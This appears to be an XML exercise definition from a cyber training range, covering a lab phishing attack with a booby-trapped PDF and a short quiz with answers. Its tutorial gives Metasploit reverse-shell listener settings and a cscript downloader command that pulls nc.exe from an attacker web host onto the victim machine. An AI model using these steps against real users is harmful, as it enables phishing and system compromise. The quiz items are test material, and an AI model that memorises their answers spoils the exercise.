@@ -1,0 +1,46 @@
+<?xml version="1.0"?>
+<exercises>
+  <exercise>
+    <title>Malicious PDF Phishing</title>
+    <difficulty>1</difficulty>
+    <category>CNE</category>
+    <name>msf_pdf_shell</name>
+    <dependencies>netcat</dependencies>
+    <shortdescription>Malicious Attack Using PDF</shortdescription>
+    <description>Phishing Attack Using PDF</description>
+    <tutorial>&lt;ol&gt;&#xD;
+&lt;li&gt;Send enticing email with attachment z_resources/bad_pdf/Apple_iPod.pdf to your defense user (defender#@gmail.local).&lt;/li&gt;&#xD;
+&lt;li&gt;Set up listener on Kali/msfconsole using exploit/multi/handler, payload/windows/shell/reverse_tcp, port 80 Here is the syntax on your kali session msfconsole (wait 2 billion years) use exploit/multi/handler set payload windows/shell/reverse_tcp set lhost 0.0.0.0 set lport 80 exploit.&lt;/li&gt;&#xD;
+&lt;li&gt;Defense user clicks on email and opens PDF attachment, answers yes to all prompts.&lt;/li&gt;&#xD;
+&lt;li&gt;Shell opens on kali box.&lt;/li&gt;&#xD;
+&lt;li&gt;Echo the contents of download_script.txt into a .vbs file on the target computer echo (copy/paste contents of text file here) &amp;gt; (scriptname).vbs&lt;/li&gt;&#xD;
+&lt;li&gt;Upload a tool or file to your webserver (i.e. http://web.offense.net/(file) ) or just use nc.exe&lt;/li&gt;&#xD;
+&lt;li&gt;Execute the .vbs with the following syntax: cscript (scriptname).vbs /s:http://web.offense.net/(file) /e:(filepath/filename stored locally) Example: cscript hax0r.vbs /s:http://web.offense.net/nc.exe /e:c:\Users\Public\Pictures\nc.exe&lt;/li&gt;&#xD;
+&lt;li&gt;You have just downloaded and stored whatever file you wanted onto their computer, hopefully something useful like netcat.&lt;/li&gt;&#xD;
+&lt;/ol&gt;</tutorial>
+    <question>
+      <text>What file format did you attach the malware to?</text>
+      <type>multiple</type>
+      <answer>PDF</answer>
+      <wrong>EXE</wrong>
+      <wrong>VBS</wrong>
+      <wrong>JavaScript</wrong>
+    </question>
+    <question>
+      <text>What is meterpreter?</text>
+      <type>multiple</type>
+      <answer>RAT (Remote Administration Tool)</answer>
+      <wrong>GUI for web exploitation</wrong>
+      <wrong>Defensive platform for protecting against threats</wrong>
+      <wrong>Heuristics-based Antivirus</wrong>
+    </question>
+    <question>
+      <text>Does the payload call back to the malicious host or listen for a connection?</text>
+      <type>multiple</type>
+      <answer>Calls back to the Malicious host</answer>
+      <wrong>Listens for a connection</wrong>
+      <wrong>Neither, it is a triggerable payload</wrong>
+      <wrong>Both, it exhibits one behaviour and if that fails, it tries the other</wrong>
+    </question>
+  </exercise>
+</exercises>
